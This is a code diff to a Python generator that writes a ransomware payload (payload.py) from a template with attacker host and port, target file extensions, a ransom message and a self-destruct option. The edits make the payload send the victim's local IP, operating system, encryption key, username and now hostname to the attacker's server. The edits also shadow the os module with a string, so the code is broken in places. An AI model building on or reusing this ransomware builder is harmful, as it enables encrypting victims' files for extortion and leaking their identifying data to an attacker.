@@ -1,8 +1,7 @@
 import platform
 
 def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct):
-    demon = """#/usr/bin/env python3
-import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
+    demon = """import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
 <ttk>
@@ -33,8 +32,10 @@ port = <port>
 key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
 key = key.encode('utf-8')
 
-global platform
-platform = platform.system()
+global os
+global name
+os = platform.system()
+hostname = platform.node()
 
 # Encrypt file that endswith
 ext = [<ext>]
@@ -77,7 +78,7 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        msg = '%s$%s$%s$%s' % (getlocalip(), platform, key, getpass.getuser())
+        msg = '%s$%s$%s$%s$%s' % (getlocalip(), os, key, getpass.getuser(), hostname)
         server.send(msg.encode('utf-8'))
 
         <encrypt>
@@ -147,7 +148,7 @@ class mainwindow(Tk):
             except KeyboardInterrupt:
                 print('Closed...')
 
-        if platform == 'Windows':
+        if os == 'Windows':
             pass
         else:
             start_thread()
@@ -273,6 +274,7 @@ def encrypt_file(file_name, key):
         photo = PIL.ImageTk.PhotoImage(resized)"""
         demon = demon.replace('<import_pil>', 'import PIL.Image, PIL.ImageTk')
         demon = demon.replace('<load_image>', load_image)
+
 
     with open('./payload.py', 'w') as f:
         f.write(demon)
